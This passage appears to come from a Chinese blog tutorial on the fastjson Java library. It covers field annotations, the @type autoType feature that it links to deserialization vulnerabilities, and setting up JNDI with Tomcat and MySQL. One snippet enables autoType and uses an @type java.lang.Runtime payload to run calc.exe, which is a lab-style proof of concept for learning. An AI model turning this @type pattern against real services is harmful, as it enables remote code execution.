class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将一个 JSON 字符串反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;user_name\&quot;:\&quot;Bob\&quot;,\&quot;user_age\&quot;:20&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + <span class="string">&quot;, &quot;</span> + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的 Java 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="meta">@JSONField(name = &quot;user_name&quot;)</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="meta">@JSONField(name = &quot;user_age&quot;)</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678850867581-374608ce-3e06-4a4e-a605-07877bc810af.png#averageHue=%23757258&clientId=u5a3e9323-ecb0-4&from=paste&height=818&id=ua4f98178&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=183193&status=done&style=none&taskId=u146cb755-819c-468f-b3d3-20025bb1e31&title=&width=1536" alt="image.png"><br>可以看到，我们在定义<code>name</code>和<code>age</code>的时候，在上面分别加入了一行<code>@JSONField(name = &quot;user_name&quot;)</code>和<code>@JSONField(name = &quot;user_age&quot;)</code>，这样一来，即使我们输入的字符串中写的是<code>user_name</code>和<code>user_age</code>，它也能被识别解析到。</p><h4 id="②问题2：为什么我初始化对象的时候，代码明明写的是Person-person-new-Person-Alice-18-，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？"><a href="#②问题2：为什么我初始化对象的时候，代码明明写的是Person-person-new-Person-Alice-18-，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？" class="headerlink" title="②问题2：为什么我初始化对象的时候，代码明明写的是Person person = new Person(&quot;Alice&quot;, 18);，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？"></a>②问题2：为什么我初始化对象的时候，代码明明写的是<code>Person person = new Person(&quot;Alice&quot;, 18);</code>，<code>name</code>在前，<code>age</code>在后，怎么转化成<code>json</code>字符串的时候就变成了<code>age</code>在前，<code>name</code>在后了？</h4><p>原来，在<code>fastjson</code>中，默认情况下，生成的<code>JSON</code>字符串的顺序是按照<strong>属性的字母顺序</strong>进行排序的，而不是按照属性在类中的声明顺序。<br>如果我们希望按照属性在类中的声明顺序来生成<code>JSON</code>字符串，可以通过在类中使用<code>@JSONType</code>注解来设置属性的序列化顺序，请看下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将一个 Java 对象序列化为 JSON 字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将一个 JSON 字符串反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;Bob\&quot;,\&quot;age\&quot;:20&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + <span class="string">&quot;, &quot;</span> + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的 Java 类</span></span><br><span class="line">    <span class="meta">@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678851311173-7f2e6fbb-561f-4c31-8208-739a2a71ff7a.png#averageHue=%23767259&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=u6e9a585a&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182305&status=done&style=none&taskId=u02c4f8e8-800e-47cc-897e-86d2462328c&title=&width=1536" alt="image.png"><br>我们通过<code>@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</code>来指定属性的序列化顺序，这样就是<code>name</code>在前，<code>age</code>在后了。</p><h2 id="2-type是什么东西？如何反序列化带-type的json字符串？"><a href="#2-type是什么东西？如何反序列化带-type的json字符串？" class="headerlink" title="2. @type是什么东西？如何反序列化带@type的json字符串？"></a>2. @type是什么东西？如何反序列化带@type的json字符串？</h2><blockquote><p>参考：<a href="https://www.cnblogs.com/nice0e3/p/14601670.html">https://www.cnblogs.com/nice0e3/p/14601670.html</a></p></blockquote><p>我们在网上看到了很多讲<code>fastjson</code>反序列化漏洞的文章，里面都提到了<code>@type</code>，那么它到底是什么呢？<br><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。请看以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;java.lang&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到直接弹窗了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678869601540-2685c1d7-35f6-45f0-91eb-2ea1e5d42845.png#averageHue=%23807f5c&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=ubbdc38c5&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202604&status=done&style=none&taskId=uaf5b0ade-bd8a-401d-aeff-cb67221e624&title=&width=1536" alt="image.png"><br>由于<code>fastjson</code>在<code>1.2.24</code>之后默认禁用@type，因此这里我们通过<code>ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</code>来开启，否则会报错<code>autoType is not support</code>。<br>我们再看这样的一个<code>demo</code>：<br>首先是类的定义，例如我们的<code>Person.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是<code>Main.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680531069142-af92a844-9476-4eda-8546-f7980d14f043.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=816&id=ucb05a2cf&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155901&status=done&style=none&taskId=u56178bd4-dd62-460c-b947-a440ab336f4&title=&width=1536" alt="image.png"><br>在和前面代码做对比后，可以发现其实就是在调用<code>toJSONString</code>方法的时候，参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得<code>Fastjson</code>支持自省，开启自省后序列化成<code>JSON</code>的数据就会多一个<code>@type</code>，这个是代表对象类型的<code>JSON</code>文本。<code>FastJson</code>的漏洞就是他的这一个功能去产生的，在对该<code>JSON</code>数据进行反序列化的时候，会去调用指定类中对于的<code>get/set/is</code>方法， 后面会详细分析。<br>然后我们就可以通过以下三种方式来反序列化<code>json</code>字符串了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一（返回JSONObject对象）：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">user.setAge(<span class="number">18</span>);</span><br><span class="line">user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parse(s1);</span><br><span class="line">System.out.println(jsonObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">user.setAge(<span class="number">18</span>);</span><br><span class="line">user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line"><span class="type">Person</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(s, Person.class);</span><br><span class="line">System.out.println(user1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法三：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">user.setAge(<span class="number">18</span>);</span><br><span class="line">user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="type">Person</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(s1,Person.class);</span><br><span class="line">System.out.println(user1);</span><br></pre></td></tr></table></figure><p>执行结果都是一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person&#123;name=<span class="string">&#x27;xiaoming&#x27;</span>, age=<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="3-JNDI是什么东西？"><a href="#3-JNDI是什么东西？" class="headerlink" title="3. JNDI是什么东西？"></a>3. JNDI是什么东西？</h2><p><code>JNDI</code>是<code>Java</code>平台的一种<code>API</code>，它提供了访问各种命名和目录服务的统一方式。<code>JNDI</code>通常用于在<code>JavaEE</code>应用程序中查找和访问资源，如<code>JDBC</code>数据源、<code>JMS</code>连接工厂和队列等。<br>光这么说还是太抽象了，直接上例子。如果我们想要搭建一个<code>jndi</code>的环境，我们需要这么做：<br>首先需要说明的是我<code>Java</code>版本是<code>17</code>，如果不是的话需要安装配置，不然后面的可能会报错，百度谷歌都没用的那种。</p><h3 id="（1）整一个tomcat容器，并在容器中配置数据源"><a href="#（1）整一个tomcat容器，并在容器中配置数据源" class="headerlink" title="（1）整一个tomcat容器，并在容器中配置数据源"></a>（1）整一个tomcat容器，并在容器中配置数据源</h3><p>打开<code>[https://tomcat.apache.org/](https://tomcat.apache.org/)</code>，然后点击<code>Download</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871742488-2dd6261d-7a5a-424f-bd7c-7736a66e24f7.png#averageHue=%23f6f3ef&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=u4a2029d6&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=284463&status=done&style=none&taskId=ua9a3150e-eeab-44fb-aec6-7e1d7b40a5e&title=&width=1489.6" alt="image.png"><br>这里直接选择下载<code>64</code>位<code>Windows</code>的压缩包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871777883-2d3041ee-6687-40e3-a588-9a2f9020627e.png#averageHue=%23f9f8f6&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=udccaff86&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=168055&status=done&style=none&taskId=ue2c3e7cf-d5b2-4e67-ad6b-4d832a05ced&title=&width=1489.6" alt="image.png"><br>下载链接：<a href="https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip">https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip</a><br>解压之后，可以给改一个简洁一点的名字，例如<code>tomcat</code>，然后把<code>bin</code>目录放到环境变量中，如下图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871909392-a153df8e-e003-4b44-93dd-0369206511f6.png#averageHue=%23c3fffe&clientId=u5a3e9323-ecb0-4&from=paste&height=23&id=ud30af5fe&name=image.png&originHeight=29&originWidth=153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1185&status=done&style=none&taskId=ub5e3125f-4b16-4f27-8dc6-d65ec8071f1&title=&width=122.4" alt="image.png"><br>然后再新建一个名为<code>CATALINA_HOME</code>的路径，值为<code>tomcat</code>的根目录，例如我的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678872011706-5df6e795-dfb8-437c-9863-bf7d5cb0302a.png#averageHue=%23ededec&clientId=u5a3e9323-ecb0-4&from=paste&height=180&id=u4d821b9d&name=image.png&originHeight=225&originWidth=855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15765&status=done&style=none&taskId=u5eecb1bb-124b-4e18-9f96-4390a3d9f89&title=&width=684" alt="image.png"><br>除此之外，没有配置<code>JAVA_HOME</code>和<code>JRE_HOME</code>的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置<code>Java17</code>，否则一直闪退无法启动：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678875849493-91d36457-7833-42d0-b633-649a62e45492.png#averageHue=%23efeeec&clientId=u5a3e9323-ecb0-4&from=paste&height=575&id=u698825ed&name=image.png&originHeight=719&originWidth=789&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57359&status=done&style=none&taskId=ud6b3239b-7739-47ac-87c8-b0263557477&title=&width=631.2" alt="image.png"><br>双击<code>tomcat</code>的<code>bin</code>目录下的<code>startup.bat</code>，然后访问<code>[http://localhost:8080/](http://localhost:8080/)</code>，就可以看到服务启动成功了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678875916985-26a9e911-1d15-4486-9080-4a6b5c4ef766.png#averageHue=%23f9e8bc&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=u66a0d2d1&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=203547&status=done&style=none&taskId=ubf23ed7a-90f5-4573-a30d-881aceb0073&title=&width=1489.6" alt="image.png"><br>然后配置<code>tomcat</code>目录下的<code>context.xml</code>（<code>tomcat7</code>及以前则是配置<code>server.xml</code>）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Resource</span> <span class="attr">name</span>=<span class="string">&quot;jdbc/security&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;Container&quot;</span> <span class="attr">type</span>=<span class="string">&quot;javax.sql.DataSource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">maxTotal</span>=<span class="string">&quot;100&quot;</span> <span class="attr">maxIdle</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxWaitMillis</span>=<span class="string">&quot;10000&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">username</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;123456&quot;</span> <span class="attr">driverClassName</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">url</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/security&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884813124-e4662dda-0305-4f74-953d-751043043578.png#averageHue=%23faf8f6&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=u4b4568db&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147663&status=done&style=none&taskId=uf6cb4639-0c7a-4a26-81aa-708db810e85&title=&width=1536" alt="image.png"><br>可以根据自己本地开启的<code>mysql</code>的实际情况来改，我这里是使用<code>phpstudy</code>来安装开启<code>mysql</code>的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678878030641-e131c110-2cbf-40eb-83bd-5a9cbc7f82d1.png#averageHue=%23f6664d&clientId=u5a3e9323-ecb0-4&from=paste&height=630&id=u07a00bb8&name=image.png&originHeight=787&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62447&status=done&style=none&taskId=u4d631b99-0f87-4b27-9fbe-30e87e4318d&title=&width=800" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884839404-7bbfe528-6b66-4a09-a39f-3fba71541850.png#averageHue=%23f2f0f0&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=uf47bd28b&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189602&status=done&style=none&taskId=u0a385556-b6a2-4666-a56d-af35292aecc&title=&width=1489.6" alt="image.png"><br>然后继续配置<code>tomcat</code>的<code>conf</code>目录下的<code>web.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resource-ref</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Test DB Connection<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">res-ref-name</span>&gt;</span>jdbc/root<span class="tag">&lt;/<span class="name">res-ref-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">res-type</span>&gt;</span>javax.sql.DataSource<span class="tag">&lt;/<span class="name">res-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">res-auth</span>&gt;</span>Container<span class="tag">&lt;/<span class="name">res-auth</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resource-ref</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img 